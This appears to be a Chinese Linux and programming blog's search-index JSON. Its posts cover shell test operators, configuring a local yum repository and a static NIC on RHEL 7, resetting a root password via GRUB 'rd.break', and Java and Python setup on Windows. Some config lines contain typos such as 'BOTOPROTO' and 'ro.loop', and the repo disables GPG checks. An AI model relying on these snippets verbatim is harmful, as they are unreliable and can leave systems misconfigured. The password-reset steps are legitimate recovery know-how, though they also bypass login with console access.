&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;&#x5C0F;&#x4E8E;&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true [ $a -lt $b ]&#x8FD4;&#x56DE;true -ge &#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true [ $a -ge $b ]&#x8FD4;&#x56DE;false -le &#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true [ $a -le $b ]&#x8FD4;&#x56DE;true &#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26; &#x8FD0;&#x7B97;&#x7B26; &#x8BF4;&#x660E; &#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7; ! &#x2018;&#x975E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x628A;&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x4E2D;&#x7684;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x53D6;&#x76F8;&#x53CD;&#x503C; [ !false ]&#x8FD4;&#x56DE;true -o &#x2018;&#x6216;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x4E3A;true&#x5219;&#x8FD4;&#x56DE;true [ $a -lt 20 -o $b -gt 100]&#x8FD4;&#x56DE;true -a &#x2018;&#x4E0E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x4E24;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x90FD;&#x4E3A;true&#x624D;&#x8FD4;&#x56DE;true [ $a -lt -a $b -gt 100 ]&#x8FD4;&#x56DE;false &#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;12&amp;&amp;&#xFF0C;&#x903B;&#x8F91;`&#x4E0E;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x6210;&#x529F;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 &amp;&amp; $b -gt 100]]&#x8FD4;&#x56DE;false||&#xFF0C;&#x903B;&#x8F91;`&#x6216;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x5931;&#x8D25;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 `||` $b -gt 100]]&#x8FD4;&#x56DE;true &#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26; &#x8FD0;&#x7B97;&#x7B26; &#x8BF4;&#x660E; &#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7; = &#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true [$a = $b]&#x8FD4;&#x56DE;false != &#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true [$a != $b ]&#x8FD4;&#x56DE;true -z &#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E3A;0&#x8FD4;&#x56DE;true [ -z $a ]&#x8FD4;&#x56DE;false -n &#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E0D;&#x4E3A;0&#x8FD4;&#x56DE;true [ -n &#x201C;$a&#x201D; ]&#x8FD4;&#x56DE;true str &#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4E3A;&#x7A7A;&#x8FD4;&#x56DE;true [ $a ]&#x8FD4;&#x56DE;true &#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26; &#x8FD0;&#x7B97;&#x7B26; &#x8BF4;&#x660E; &#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7; -b &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5757;&#x8BBE;&#x5907;&#x6587;&#x4EF6; [ -b $file ]&#x8FD4;&#x56DE;false -c &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x6587;&#x4EF6; [ -c $file ]&#x8FD4;&#x56DE;false -d &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x76EE;&#x5F55;&#x7C7B;&#x578B; [ -d $file ]&#x8FD4;&#x56DE;false -f &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x666E;&#x901A;&#x6587;&#x4EF6;&#xFF08;&#x65E2;&#x4E0D;&#x662F;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x4E0D;&#x662F;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#xFF09; [ -f $file] -g &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SGID&#x4F4D; -k &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;&#x7C98;&#x7740;&#x4F4D;(Sticky Bit) -p &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x6709;&#x540D;&#x7BA1;&#x9053; -u &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SUID&#x4F4D; -r &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x8BFB; -w &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x5199; -x &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x6267;&#x884C; -s &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x7A7A; -e &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#xFF08;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF09;&#x662F;&#x5426;&#x5B58;&#x5728; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://marnm.github.io/tags/Shell/"}]},{"title":"RHEL 7配置Yum软件仓库","date":"2018-08-07T07:18:07.000Z","path":"/posts/afdfa673/","text":"&#x79BB;&#x7EBF;&#x73AF;&#x5883;&#x73AF;&#x5883;&#x4E0B;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x672C;&#x5730;yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x3002;Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x4E3A;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x7B80;&#x5316;RPM&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;&#x7684;&#x96BE;&#x5EA6;&#x4EE5;&#x53CA;&#x81EA;&#x52A8;&#x5206;&#x6790;&#x6240;&#x9700;&#x8F6F;&#x4EF6;&#x5305;&#x53CA;&#x5176;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x7684;&#x6280;&#x672F;&#x3002; &#x7B2C;1&#x6B65;&#xFF1A; &#x5207;&#x6362;&#x5230;/etc/yum.repos.d/&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;)&#x7B2C;2&#x6B65;&#xFF1A; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;.repo&#xFF09;1234567[root@rhel_7 ~]# cd /etc/yum.repos.d/[root@rhel_7 yum.repos.d]# vi rhel7.repo[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0 [rhel7] # yum&#x4ED3;&#x5E93;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;&#xFF0C;&#x907F;&#x514D;&#x4E0E;&#x5176;&#x4ED6;&#x4ED3;&#x5E93;&#x51B2;&#x7A81;&#x3002; name=rhel7 # yum&#x540D;&#x79F0;&#x63CF;&#x8FF0;&#xFF0C;&#x6613;&#x4E8E;&#x8BC6;&#x522B;&#x4ED3;&#x5E93;&#x7528;&#x5904;&#x3002; baseurl=file:///media/cdrom # &#x63D0;&#x4F9B;&#x7684;&#x65B9;&#x5F0F;&#x5305;&#x62EC;FTP(ftp://..)&#x3001;HTTP(http://..)&#x3001;&#x672C;&#x5730;(file:///..) enabled=1 # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x53EF;&#x7528;&#xFF1B;1&#x53EF;&#x7528;&#xFF0C;0&#x7981;&#x7528;&#x3002; gpgcheck=1 # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x6821;&#x9A8C;&#x6587;&#x4EF6;&#xFF0C;1&#x6821;&#x9A8C;&#xFF0C;0&#x4E0D;&#x6821;&#x9A8C;&#x3002; gpgkey=file:///media/cdrom/RPM-GPG-KEY-rehat-release # &#x82E5;gpgcheck&#x5F00;&#x542F;&#xFF0C;&#x987B;&#x6307;&#x5B9A;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x5730;&#x5740; &#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;&#x6302;&#x8F7D;ISO&#x955C;&#x50CF;&#x6216;&#x8005;&#x4E0A;&#x4F20;&#x5230;&#x672C;&#x5730; 1234[root@rhel_7 ~]&amp; mkdir -p /media/cdrom[root@rhel_7 ~]&amp; mount -t iso9660 -o loop /usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom[root@rhel_7 ~]&amp; vim /etc/fstab/usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom iso9660 defaults,ro.loop 0 0 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"https://marnm.github.io/tags/RedHat/"},{"name":"yum","slug":"yum","permalink":"https://marnm.github.io/tags/yum/"}]},{"title":"RedHat_7 配置网卡信息","date":"2018-08-07T06:24:44.000Z","path":"/posts/eb7dbe25/","text":"&#xA0;&#xA0;&#x5982;&#x679C;&#x60A8;&#x5177;&#x5907;&#x4E00;&#x5B9A;&#x7684;&#x8FD0;&#x7EF4;&#x7ECF;&#x9A8C;&#x6216;&#x8005;&#x719F;&#x6089;&#x65E9;&#x671F;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF0C;&#x5219;&#x5728;&#x5B66;&#x4E60;RHEL 7&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x4E0D;&#x5BB9;&#x6613;&#x63A5;&#x53D7;&#x7684;&#x5DEE;&#x5F02;&#x5316;&#x3002;&#x5728;RHEL 5&#x3001;RHEL 6&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x7684;&#x524D;&#x7F00;&#x4E3A;eth&#xFF0C;&#x7B2C;1&#x5757;&#x7F51;&#x5361;&#x4E3A;eth0&#xFF0C;&#x7B2C;2&#x5757;&#x7F51;&#x5361;&#x4E3A;eth1&#xFF1B;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;&#xA0;&#xA0;&#x800C;&#x5728;RHEL 7&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x524D;&#x7F00;&#x5219;&#x4E3A;ifcfg&#x5F00;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x52A0;&#x4E0A;&#x7F51;&#x5361;&#x540D;&#x79F0;&#x5171;&#x540C;&#x7EC4;&#x6210;&#x4E86;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x4F8B;&#x5982;ifcfg-eno16777736&#x3001;ifcfg-ens33&#xFF1B;&#x597D;&#x5728;&#x9664;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#x53D8;&#x5316;&#x5916;&#x4E5F;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x5927;&#x7684;&#x533A;&#x522B;&#x3002; &#x7B2C;1&#x6B65;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;/etc/sysconfig/network-scripts/&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;&#x7B2C;2&#x6B65;&#xFF1A; &#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736 &#x8BBE;&#x5907;&#x7C7B;&#x578B;&#xFF1A;TYPE=Ethernet &#x5730;&#x5740;&#x5206;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;BOOTPROTO=static &#x7F51;&#x5361;&#x540D;&#x79F0;&#xFF1A;NAME=eno16777736 &#x662F;&#x5426;&#x542F;&#x52A8;&#xFF1A;ONBOOT=yes IP&#x5730;&#x5740;&#xFF1A;IPADDR=192.168.1.10 &#x5B50;&#x7F51;&#x63A9;&#x7801;&#xFF1A;NETMASK=255.255.255.0 &#x7F51;&#x5173;&#x5730;&#x5740;&#xFF1A;GATEWAY=192.168.1.1 DNS&#x5730;&#x5740;&#xFF1A;DNS1=114.114.114.114 12345678910111213[root@rhel_7 network-scripts]# vim /etc/sysconfig/network-scripts/ifcfg-eno16777736 TYPE=Ethernet BOTOPROTO=static NAME=eno16777736 ONBOOT=yes IPADDR=192.168.1.74 NETMASK=255.255.255.0 GATEWAY=192.168.1.1 DNS1=114.114.114.114 DNS2=192.168.1.1[root@rhel_7 network-scripts]# systemctl restart network document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"https://marnm.github.io/tags/RedHat/"},{"name":"rhel","slug":"rhel","permalink":"https://marnm.github.io/tags/rhel/"}]},{"title":"RedHat Linux重置root管理员密码","date":"2018-08-05T07:48:25.000Z","path":"/posts/32546aed/","text":"&#x524D;&#x8A00;&#x5E73;&#x65E5;&#x91CC;&#x8BA9;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5934;&#x75BC;&#x7684;&#x4E8B;&#x60C5;&#x5DF2;&#x7ECF;&#x5F88;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x5076;&#x5C14;&#x628A;linux&#x7CFB;&#x7EDF;&#x7684;&#x5BC6;&#x7801;&#x5FD8;&#x8BB0;&#x4E86;&#x5E76;&#x4E0D;&#x7528;&#x614C;&#xFF0C;&#x53EA;&#x9700;&#x7B80;&#x5355;&#x51E0;&#x6B65;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5BC6;&#x7801;&#x7684;&#x91CD;&#x7F6E;&#x5DE5;&#x4F5C;&#x3002; &#x57FA;&#x4E8E;rhel&#x7248;&#x672C;RedHat&#x3001;CentOS&#x3001; &#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762; boot-img &#x5728;linux16 &#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd.break,&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl+X&#x8FD0;&#x884C;1234linux16 /vmlinuz-3.10.0-123.e17.x86_64 root=UUID=039848c2-4663-4223-a7\\52-e07bf143e52d ro rd.lvm.lv=rhel/root crashkernel=auto rd.lvm.lv=rhel/swap v\\console.font=latarcyrheb-sun16 vconsole.keymap=us rhgb quiet LANG=en_US.UTF-8\\ rd.break &#x7F16;&#x8F91;&#x5185;&#x6838;&#x754C;&#x9762; &#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4; &#x7F16;&#x8F91;&#x5982;&#x4E0B;&#x547D;&#x4EE4; 1234567switch_root:/# mount -o remount,rw /sysrootswitch_root:/# chroot /sysrootsh-4.2# passwd&#x6B64;&#x5904;&#x7565;&#x8FC7;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x8FC7;&#x7A0B;...sh-4.2# touch /.autorelabelsh-4.2# exitsh-4.2# reboot &#x57FA;&#x4E8E;debian&#x7248;&#x672C;&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;&#x6700;&#x540E;Linux&#x884D;&#x751F;&#x7248;&#x672C; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"https://marnm.github.io/tags/RedHat/"}]},{"title":"Java8 环境变量配置","date":"2018-08-03T15:34:01.000Z","path":"/posts/295162d9/","text":"&#x5982;&#x4F55;&#x5728;Windows&#x4E0B;&#x5B89;&#x88C5;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E; &#x6211;&#x7684;&#x73AF;&#x5883;Windows 10Java&#x7248;&#x672C;1.8.0_161&#x6211;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;C:\\Java\\ &#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;JAVA_HOME C:\\Java\\jdk1.8.0_161 CLASSPATH .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; &#x7F16;&#x8F91;path %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin; &#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E; java and javac 12345public class test{ public static void main(String[] args){ System.out.println(&quot;Hello World, hello java !&quot;); }} &#x4FDD;&#x5B58;&#x4E3A;test.java&#x7F16;&#x8BD1;&#x6E90;&#x4EE3;&#x7801;javac test.javajava test &#x6700;&#x540E;&#x6700;&#x65B0;&#x7248;Java&#x4E0B;&#x8F7D;&#x5730;&#x5740;Java8_se &#x4E0B;&#x8F7D;&#x5730;&#x5740; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Java","slug":"Java","permalink":"https://marnm.github.io/tags/Java/"},{"name":"编程","slug":"编程","permalink":"https://marnm.github.io/tags/编程/"}]},{"title":"Win10环境下Python2、3和pip2、3版本共存","date":"2018-08-03T15:04:25.000Z","path":"/posts/e9c6771b/","text":"&#x8FD9;&#x91CC;&#x6211;&#x4F7F;&#x7528;Win10-x64&#x7684;&#x7535;&#x8111;&#x6765;&#x64CD;&#x4F5C;&#x6211;&#x7684;Python&#x5B89;&#x88C5;&#x76EE;&#x5F55;C:\\Python\\&#x5B89;&#x88C5;Python&#x9996;&#x5148;&#x5B89;&#x88C5;Python3C:\\Python\\Python35\\&#x76F4;&#x63A5;&#x4E0B;&#x4E00;&#x6B65;&#x4E0B;&#x4E00;&#x6B65;&#x5373;&#x53EF; &#x7136;&#x540E;&#x5B89;&#x88C5;Python2C:\\Python\\Python27\\&#x5B89;&#x88C5;Python2&#x7684;&#x65F6;&#x5019;&#x628A;&#x6DFB;&#x52A0;&#x5230;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x52FE;&#x5148;&#x53BB;&#x6389; &#x4FEE;&#x6539;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7F16;&#x8F91;Path&#x53D8;&#x91CF;&#xFF0C;&#x6DFB;&#x52A0;Python2&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x8FD9;&#x91CC;&#x6211;&#x7684;&#x76EE;&#x5F55;&#x662F;C:\\Python\\Python27\\&#x548C;C:\\Python\\Python27\\Scripts\\ &#x5C06;python.exe&#x91CD;&#x547D;&#x540D;&#x4E86;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;python3.exe&#xFF1B;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x6210;python2.exe&#x5373;&#x53EF; pip&#x7684;&#x8BBE;&#x7F6E; Python &#x5B89;&#x88C5;&#x5305;&#x9700;&#x8981;&#x7528;&#x5230;&#x5305;&#x7BA1;&#x7406;&#x5DE5;&#x5177;pip&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x540C;&#x65F6;&#x5B89;&#x88C5;python2&#x548C;python3&#x7684;&#x65F6;&#x5019;&#xFF0C;pip&#x53EA;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x4EE5;&#x4E0B;&#x5C06;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x4FEE;&#x6539;&#x65B9;&#x5F0F;&#xFF0C;&#x5373;&#x91CD;&#x65B0;&#x5B89;&#x88C5;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;pip&#xFF0C;&#x4F7F;&#x5F97;&#x4E24;&#x4E2A;python&#x7248;&#x672C;&#x7684;pip&#x80FD;&#x591F;&#x5171;&#x5B58;&#x3002;&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;python3 -m pip install --upgrade pip --force-reinstall python2 -m pip install --upgrade pip --force-reinstall document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"编程","slug":"编程","permalink":"https://marnm.github.io/tags/编程/"},{"name":"Python2","slug":"Python2","permalink":"https://marnm.github.io/tags/Python2/"},{"name":"pip","slug":"pip","permalink":"https://marnm.github.io/tags/pip/"}]},{"title":"自由的灵魂必将远航","date":"2018-08-03T13:55:24.000Z","path":"/posts/9e3f6743/","text":"&#x4F60;&#x80CC;&#x5355;&#x8BCD;&#x65F6;&#xFF0C;&#x963F;&#x62C9;&#x65AF;&#x52A0;&#x7684;&#x9CD5;&#x9C7C;&#x6B63;&#x8DC3;&#x51FA;&#x6C34;&#x9762;&#xFF1B;&#x4F60;&#x7B97;&#x6570;&#x5B66;&#x65F6;&#xFF0C;&#x592A;&#x5E73;&#x6D0B;&#x5F7C;&#x5CB8;&#x7684;&#x6D77;&#x9E25;&#x632F;&#x7FC5;&#x63A0;&#x8FC7;&#x57CE;&#x5E02;&#x4E0A;&#x7A7A;&#xFF1B;&#x4F60;&#x665A;&#x81EA;&#x4E60;&#x65F6;&#xFF0C;&#x6781;&#x5708;&#x4E0A;&#x7684;&#x591C;&#x7A7A;&#x6563;&#x6F2B;&#x4E86;&#x4E94;&#x5F69;&#x6591;&#x6593;&#xFF1B;&#x4F46;&#x662F;&#x5C11;&#x5E74;&#x4F60;&#x522B;&#x7740;&#x6025;&#xFF0C;&#x5728;&#x4F60;&#x4E3A;&#x81EA;&#x5DF1;&#x672A;&#x6765;&#x8E0F;&#x8E0F;&#x5B9E;&#x5B9E;&#x5730;&#x52AA;&#x529B;&#x65F6;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x611F;&#x89C9;&#x4ECE;&#x6765;&#x4E0D;&#x4F1A;&#x770B;&#x5230;&#x7684;&#x666F;&#x8272;&#xFF0C;&#x90A3;&#x4E9B;&#x4F60;&#x89C9;&#x5F97;&#x7EC8;&#x8EAB;&#x4E0D;&#x4F1A;&#x9047;&#x5230;&#x7684;&#x4EBA;&#xFF0C;&#x6B63;&#x4E00;&#x6B65;&#x6B65;&#x5411;&#x4F60;&#x8D70;&#x6765;&#x3002;&#x6211;&#x60F3;&#x8C61;&#x4E0D;&#x5230;&#x5728;&#x8FD9;&#x4E2A;&#x661F;&#x7403;&#x53D1;&#x751F;&#x7684;&#x5F88;&#x591A;&#x7F8E;&#x597D;&#x7684;&#x666F;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x624D;&#x52AA;&#x529B;&#xFF0C;&#x56E0;&#x4E3A;&#x4E16;&#x754C;&#x90A3;&#x4E48;&#x5927;&#xFF0C;&#x6211;&#x60F3;&#x53BB;&#x770B;&#x770B;&#x3002; &#x4F9D;&#x7136;&#x8FD8;&#x662F;&#x5F88;&#x559C;&#x6B22;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C; &#x6211;&#x8FD8;&#x5728;&#x52AA;&#x529B;&#xFF0C;&#x6240;&#x4EE5;&#x7B49;&#x7B49;&#x6211; &#x563B;&#x563B;&#xFF0C;&#x539F;&#x6765;&#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x4E0D;&#x7B97;&#x9E21;&#x6C64;&#x5440; img &#x5B66;&#x5F1F;&#x5B66;&#x59B9;&#x4E5F;&#x52A0;&#x6CB9;&#xFF0C;&#x6211;&#x5728;&#x8DDD;&#x79BB;&#x6E05;&#x534E;5&#x516C;&#x91CC;&#x5916;&#x7684; &#x5317;&#x56DB;&#x73AF;&#xFF0C;&#x7B49;&#x4F60; &#x53EA;&#x662F;&#x4E2A;&#x6C89;&#x9ED8;&#x7684;&#x5927;&#x591A;&#x6570; &#x591A;&#x8BF4;&#x4E86;&#x51E0;&#x53E5;&#x8BDD;&#x3002; &#x8FD9;&#x53E5;&#x8BDD;&#xFF0C;&#x597D;&#x50CF;&#x6211;&#x60F3;&#x5728;&#x7684;&#x751F;&#x6D3B;&#x72B6;&#x6001; &#x5FEB;&#x8282;&#x594F;&#x7684;&#x751F;&#x6D3B; &#x5F53;&#x4F60;&#x8BA4;&#x771F;&#x8D77;&#x6765;&#x7684;&#x6837;&#x5B50;&#x771F;&#x7684;&#x6709;&#x70B9;&#x53EF;&#x7231; doge | 300x300 books to be or not to be.that is the 